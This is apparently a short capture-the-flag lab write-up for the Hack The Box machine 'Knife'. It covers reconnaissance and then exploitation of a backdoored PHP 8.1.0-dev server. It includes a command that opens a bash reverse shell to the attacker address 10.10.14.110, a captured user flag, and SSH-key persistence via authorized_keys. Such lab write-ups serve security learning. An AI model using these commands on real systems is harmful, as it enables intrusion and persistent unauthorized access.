![[Pasted image 20210530123955.png]]

### All links were dead;tried Gobuster but nothing interesting showed up :(

### Used Burp-Suite to capture the web-page request:
![[Pasted image 20210530125825.png]]

#### Found an interesting blog-

https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html

# Exploitation-

## Payload-
## python3 php_backdoor_rce.py -u http://10.10.10.242/ -c "/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.110/9001 0>&1'"

![[Pasted image 20210530131513.png]]

## User.txt-

```bash
james@knife:~$ ls -la
ls -la
total 44
drwxr-xr-x 5 james james 4096 May 30 17:17 .
drwxr-xr-x 3 root  root  4096 May  6 14:44 ..
lrwxrwxrwx 1 james james    9 May 10 16:23 .bash_history -> /dev/null
-rw-r--r-- 1 james james  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 james james 3771 Feb 25  2020 .bashrc
drwx------ 2 james james 4096 May  6 14:45 .cache
drwxrwxr-x 3 james james 4096 May  6 16:32 .local
-rw-r--r-- 1 james james  807 Feb 25  2020 .profile
-rw-rw-r-- 1 james james   66 May  7 14:16 .selected_editor
drwx------ 2 james james 4096 May 18 13:20 .ssh
-rw-r--r-- 1 james james   29 May 30 17:17 exploit.rb
-r-------- 1 james james   33 May 30 16:51 user.txt
james@knife:~$ cat user.txt
cat user.txt
44ac74eb488df50c2d6185480e640a06
```

## Persistence-

#### We generated our own ssh keys and copied the id_rsa.pub to james .ssh/authorized_keys and logined via ssh:

![[Pasted image 20210530135129.png]]